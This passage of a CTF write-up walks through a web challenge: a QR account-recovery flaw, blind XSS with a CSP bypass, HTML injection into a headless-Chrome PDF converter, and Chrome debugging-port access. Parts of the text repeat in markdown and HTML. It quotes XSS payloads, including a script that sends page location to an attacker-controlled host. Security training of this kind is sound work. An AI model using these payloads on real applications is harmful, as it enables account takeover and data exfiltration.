Abusing account recovery via QR codes to get access to jobert@mydocz.cosmic.\n2. Blind XSS in `/support/review/\u003creview_id\u003e` (including CSP bypass).\n3. Missing input sanitization on `name` parameter when POSTing to `/support/review/\u003creview_id\u003e`.\n4. Access to remote debugging port on local Chrome instance leaking ID of secret document.\n5. **h1ctf{y3s_1m_c0sm1c_n0w}**\n\nI also included a python script F691360 which is going through the whole challenge (it's a result of a number of scripts I used to automate repetitive tasks).\n\n## Details\n\n### Introduction\n\nhttps://h1-415.h1ctf.com hosted a simple web application allowing to convert images into PDF files. Anyone could register a trial account. Signing in would give access to the converter and basic account management which allowed only a name change. The converter allowed to upload JPG and PNG files only. The resulting PDF would include the uploaded image and the user's name.\n\n### Step 1 - One '{' is all it takes.\n\nAfter a few attempts to include HTML in my user name (`\u003c` and `\u003e` were filtered) or trying to upload arbitrary files, both ways seemed as dead ends. I decided to focus on the account recovery flow. \n\nAfter a successful registration, the application would generate a QR code for account recovery. The QR code was a string in the following format:\n\n```\nascii_hex(user@example.com):\u003csome_random_secret_in_hex\u003e\n```\n\nAfter submitting the QR code to `/recover`, the applicaion would respond with a new session giving access to the user account. After some trial and error, I noticed that the application would right-strip `{` (and any subsequent `{` and `}`) characters from the email when generating the QR code.\n\nThis meant that registering with `jobert@mydocz.cosmic{` would give back a valid QR code for `jobert@mydocz.cosmic`.\n\n### Step 2 - Wow that's cosmic.\n\nAfter logging in as `jobert@mydocz.cosmic` the support chat would became available as Jobert was a proper customer. The first thing I did was sending `flag` into the support chat. The response was as follows:\n\n```\n{\"response\":\"I love flags! Where is yours? Wait... I think someone is converting top secret documents as we speak!\"}\n```\n\nThis response would led me to the deepest rabbit hole I've ever went down. \n\nAnyway, inspecting the JavaScript files included in the page, I learned that it's possible to end the chat with `quit` or `finish`. Once a chat ended, the application would ask for feedback, claiming that a negative, 1-star feedback would be reviewed by support staff. This just begs for blind XSS.\n\nSubmitting a simple XSS payload would confirm that vulnerability on the current page. However, there was a CSP preventing inline script execution:\n\n```\nContent-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self' https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: *\n```\n\nSeeing that CSP instantly reminded me of [Michał Bentkowski's tweet](https://twitter.com/SecurityMB/status/1162690916722839552). It turns out that raw.githack.com would decode the URL path and therefore it was trivial to bypass using:\n\n```\n\u003cscript src='https://raw.githack.com/mattboldt/typed.js/master/lib%252f..%252f..%252f..%252f..%252fbayotop/playground/master/g2.js'\u003e\u003c/script\u003e\n```\n\nThe first payload that I used was `fetch('https://\u003cdomain-under-my-control\u003e')` to confirm the vulnerability. However, because of the `default-src` directive it wasn't possible to make connections other than to `self` (`connect-src`). I ended up bypassing this via `window.location = 'https://\u003cdomain-under-my-control\u003e'`.\n\nAs you can see [in my commit history](https://github.com/bayotop/playground/commits/master) I was stuck at this point for quite a while. The page was rendered in a headless Chrome instance without an authenticated session. As it turned out, the only information needed to proceed to the next step was a glimpse on the DOM and `window.location`.\n\n### Step 3 - One HTML injection isn't enough. \n\nThe DOM revealed that the support stuff had the ability to change a user's name. Using any authenticated session, it was possible to change any user name except for users with ids 1 and 2. Moreover, the name wasn't sanitized this time! This allowed to change a user's name to HTML that would be rendered during the PDF conversion. I quickly confirmed this using `\u003ciframe src='https://\u003cdomain-under-my-control\u003e'\u003e\u003c/iframe\u003e`. Afterwards, I used a different payload - `\u003cscript\u003ewindow.location='http://ip-under-my-control'+window.location\u003c/script\u003e` - to learn the context I was in. \n\nIt was `http://localhost:3000/converter/\u003crandom-id\u003e.png?user_name=\u003cuser_name\u003e`. This meant that I couldn't simply access `file://`.\n\n### Step 4 - The \"secret\" was 9222.\n\nAt this point I got stuck for a long long time. I tried to find other services listening locally (using [aquatone's xlarge list](https://github.com/michenriksen/aquatone)). I was looking for parameter injection through the user name trying to inject `--allow-file-access-from-file` when starting the Chrome instance. I tried to discover new endpoints and look for differences on existing ones when served locally.\n\nI had a lightbulb moment: `I think someone is converting top secret documents as we speak!`. Was the support chat message a hint? It had to be user with id 1. Using the registration form, I figured that the user's username and email were `admin` and `admin@mydocz.cosmic`). It wasn't possible to recover into that account. It all made sense. I had to use the support staff's endpoint to change the admin's user name to `\u003cscript\u003ewindow.location='http://\u003cip-under-my-control\u003e'\u003c/script\u003e` and wait for the admin to upload a file. I tried SQL, NoSQL, XPath injections. I tried path traversal ([jobert's older tweet](https://twitter.com/jobertabma/status/1071091295425191937) was a really good candidate). I tried all possible encodings. The application was kind of slow to respond and after every 500 it would timeout for a few minutes, so all of this took ages. Nothing worked.\n\nWhile doing my fuzzing I have accidentally overwritten the user name of a bunch other users. At least one noticed as they sent me a message:\n\n```\n/var/log/nginx/access.log ... \"GET /?x=stop_messing_with_mydocz_account_im_jobert_and_i_need_it HTTP/1.1\" ...\n/var/log/nginx/access.log ... \"GET /?x=see_you_in_San_Francisco HTTP/1.1\" ...\n/var/log/nginx/access.log ... \"GET /?x=but_Im_gonna_snatch_the_swag_pack HTTP/1.1\" ...\n```\n\nI'm super sorry for interfering! Hopefully I didn't cause too much harm. Please let me know if you managed to grab that swag pack (ideally once we meet in SF :)).\n\nI started to realize this wouldn't work, however, I had no other ideas. Until I saw these 2 messages in a Slack thread (thanks [@soiaxx](https://twitter.com/soiaxx)):\n\n```\nif it's chrome headless and u can see the generated pdf, and u can access the devtools port on localhost:9222 by default.... you can access file:// :stuck_out_tongue:\nif you can run javascript :smile: so much ifs\n```\n\n*For the sake of transparency, it was a completely unrelated thread. I'm not sure if the involved parties knew about this particular CTF.*\n\nI tried setting my user name to `\u003ciframe width=900 height=900 src=\"http://localhost:9222/\"\u003e\u003c/iframe\u003e` and uploaded a file. It worked, it rendered two words: \"Inspectable WebContents\". [This StackOverflow answer](https://stackoverflow.com/a/29893173/5136654) mentions a `/json` endpoint showing available debug targets.

As it turned out, the only information needed to proceed to the next step was a glimpse on the DOM and \u003ccode\u003ewindow.location\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch3 id=\"step-3-one-html-injection-isn-t-enough\"\u003eStep 3 - One HTML injection isn\u0026#39;t enough.\u003c/h3\u003e\n\n\u003cp\u003eThe DOM revealed that the support stuff had the ability to change a user\u0026#39;s name. Using any authenticated session, it was possible to change any user name except for users with ids 1 and 2. Moreover, the name wasn\u0026#39;t sanitized this time! This allowed to change a user\u0026#39;s name to HTML that would be rendered during the PDF conversion. I quickly confirmed this using \u003ccode\u003e\u0026lt;iframe src=\u0026#39;https://\u0026lt;domain-under-my-control\u0026gt;\u0026#39;\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/code\u003e. Afterwards, I used a different payload - \u003ccode\u003e\u0026lt;script\u0026gt;window.location=\u0026#39;http://ip-under-my-control\u0026#39;+window.location\u0026lt;/script\u0026gt;\u003c/code\u003e - to learn the context I was in. \u003c/p\u003e\n\n\u003cp\u003eIt was \u003ccode\u003ehttp://localhost:3000/converter/\u0026lt;random-id\u0026gt;.png?user_name=\u0026lt;user_name\u0026gt;\u003c/code\u003e. This meant that I couldn\u0026#39;t simply access \u003ccode\u003efile://\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch3 id=\"step-4-the-secret-was-9222\"\u003eStep 4 - The \u0026quot;secret\u0026quot; was 9222.\u003c/h3\u003e\n\n\u003cp\u003eAt this point I got stuck for a long long time. I tried to find other services listening locally (using \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmichenriksen%2Faquatone\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eaquatone\u0026#39;s xlarge list\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e). I was looking for parameter injection through the user name trying to inject \u003ccode\u003e--allow-file-access-from-file\u003c/code\u003e when starting the Chrome instance. I tried to discover new endpoints and look for differences on existing ones when served locally.\u003c/p\u003e\n\n\u003cp\u003eI had a lightbulb moment: \u003ccode\u003eI think someone is converting top secret documents as we speak!\u003c/code\u003e. Was the support chat message a hint? It had to be user with id 1. Using the registration form, I figured that the user\u0026#39;s username and email were \u003ccode\u003eadmin\u003c/code\u003e and \u003ccode\u003eadmin@mydocz.cosmic\u003c/code\u003e). It wasn\u0026#39;t possible to recover into that account. It all made sense. I had to use the support staff\u0026#39;s endpoint to change the admin\u0026#39;s user name to \u003ccode\u003e\u0026lt;script\u0026gt;window.location=\u0026#39;http://\u0026lt;ip-under-my-control\u0026gt;\u0026#39;\u0026lt;/script\u0026gt;\u003c/code\u003e and wait for the admin to upload a file. I tried SQL, NoSQL, XPath injections. I tried path traversal (\u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fjobertabma%2Fstatus%2F1071091295425191937\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ejobert\u0026#39;s older tweet\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e was a really good candidate). I tried all possible encodings. The application was kind of slow to respond and after every 500 it would timeout for a few minutes, so all of this took ages. Nothing worked.\u003c/p\u003e\n\n\u003cp\u003eWhile doing my fuzzing I have accidentally overwritten the user name of a bunch other users. At least one noticed as they sent me a message:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/var/log/nginx/access.log ... \u0026quot;GET /?x=stop_messing_with_mydocz_account_im_jobert_and_i_need_it HTTP/1.1\u0026quot; ...\n/var/log/nginx/access.log ... \u0026quot;GET /?x=see_you_in_San_Francisco HTTP/1.1\u0026quot; ...\n/var/log/nginx/access.log ... \u0026quot;GET /?x=but_Im_gonna_snatch_the_swag_pack HTTP/1.1\u0026quot; ...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI\u0026#39;m super sorry for interfering!
